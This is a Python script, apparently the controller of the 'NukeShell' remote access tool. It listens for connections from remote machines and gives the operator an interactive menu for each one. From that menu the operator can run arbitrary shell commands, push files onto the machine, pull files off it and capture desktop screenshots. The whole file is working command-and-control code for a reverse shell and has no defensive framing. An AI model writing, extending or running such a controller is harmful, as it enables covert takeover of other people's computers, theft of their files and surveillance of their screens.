#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Author : LimerBoy
# github.com/LimerBoy/NukeShell

# Import modules
from os import path
from time import sleep
from colorama import Fore
from Core.server import ServerListen
from Core.cli import Clear, ParseArgs, Banner
from Core.clients import Client, ClientsManager

# Parse arguments
print(Banner)
args = ParseArgs()

# Server settings
SERVER_HOST = args.host
SERVER_PORT = args.port

# Init TCP server
server = ServerListen(SERVER_HOST, SERVER_PORT)

while True:
    # Lock while no clients connected
    print(f"{Fore.GREEN}[Server]{Fore.WHITE} Waiting for connections ...{Fore.RESET}")
    ConnectedClients = []
    while len(ConnectedClients) <= 0:
        ConnectedClients = ClientsManager.GetConnectedClients()
        try:
            sleep(0.2)
        except KeyboardInterrupt:
            server.StopServer()
    # Print all connected clients
    for i, client in enumerate(ConnectedClients):
        print("{}[Client {}] {}{}:{}{}".format(Fore.LIGHTYELLOW_EX, i+1, Fore.WHITE, *client.address, Fore.RESET))

    # Get client from list
    try:
        data = input(f"\n{Fore.GREEN}[Server]{Fore.WHITE} Please select client from list: {Fore.RESET}")
        # Cls
        if not data or data.lower() in ["cls", "clear"]:
            # Clear terminal window
            Clear()
            continue
        # Exit
        elif data.lower() in ["q", "exit", "quit", "stop"]:
            raise KeyboardInterrupt
        # Parse client from list
        client = ConnectedClients[int(data) - 1]
    except ValueError:
        Clear()
        print(f"{Fore.RED}[Server]{Fore.WHITE} Please enter digit{Fore.RESET}")
        continue
    except IndexError:
        Clear()
        print(f"{Fore.RED}[Server]{Fore.WHITE} Please select from 1 to",
              len(ConnectedClients), Fore.RESET)
        continue
    except KeyboardInterrupt:
        # Disconnect all clients from server
        server.StopServer()
    except Exception as error:
        print(f"{Fore.RED}[Server]{Fore.WHITE} An error occurred\n", error)
        continue

    # Clear terminal window
    Clear()

    # Show client welcome message
    welcome = client.Shell("get_welcome_string")
    print(welcome + "\n")

    # Execute commands
    while True:
        # Get input
        prefix = client.Shell("get_commandline_string")
        command = input(prefix)
        response = ""
        # Check if command exists
        if len(command) == 0:
            continue
        # Upload file from server to client
        elif command.startswith("upload"):
            file = command.replace("upload ", "")
            if path.exists(file):
                client.Send("begin_file_upload")
            response = client.SendFile(file)
            client.Read()  # Clean
        # Download file from client to server
        elif command.startswith("download"):
            file = command.replace("download ", "")
            client.Send(f"begin_file_download*{file}")
            response = client.ReceiveFile()
            client.Read()  # Clean
        # Get desktop screenshot
        elif command.startswith("screenshot"):
            client.Send("create_screenshot")
            response = client.ReceiveFile()
            client.Read()  # Clean
        # Exit from shell
        elif command.startswith("exit"):
            # Clear terminal window
            Clear()
            print(f"{Fore.GREEN}[Server] {Fore.WHITE}Exiting from active shell ...{Fore.RESET}")
            break
        # Disconnect client
        elif command.startswith("disconnect"):
            # Clear terminal window
            Clear()
            client.Disconnect()
            break
        # Execute shell command
        else:
            response = client.Shell(command)
        # Show output
        print(f"{Fore.WHITE}{response}{Fore.RESET}")

